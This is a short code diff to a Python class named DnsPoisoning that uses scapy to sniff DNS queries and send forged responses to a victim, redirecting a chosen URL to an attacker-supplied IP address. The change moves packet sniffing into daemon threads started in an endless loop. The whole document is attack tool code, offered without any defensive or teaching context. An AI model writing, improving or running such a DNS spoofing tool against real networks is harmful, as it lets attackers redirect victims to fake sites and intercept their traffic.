@@ -1,5 +1,6 @@
 import sys
 import time
+import threading
 from scapy.all import *
 
 class DnsPoisoning:
@@ -28,8 +29,14 @@ class DnsPoisoning:
                         # send the poison packet to the victim
                         send(poisonPacket, verbose=0, iface=interface)
                         print("Fake packet sent")
-        while True:
+
+        def sniffing():
             sniff(count=1, store=0, prn=lambda pkt: makeFakeResponse(pkt, ipVictim, url, ipPoison, self.interface),
                   iface=self.interface)
+
+        while True:
+            doSniffThread = threading.Thread(name="sniffThread", target=sniffing)
+            doSniffThread.daemon = True
+            doSniffThread.start()
 
         # print("You are poisoned")
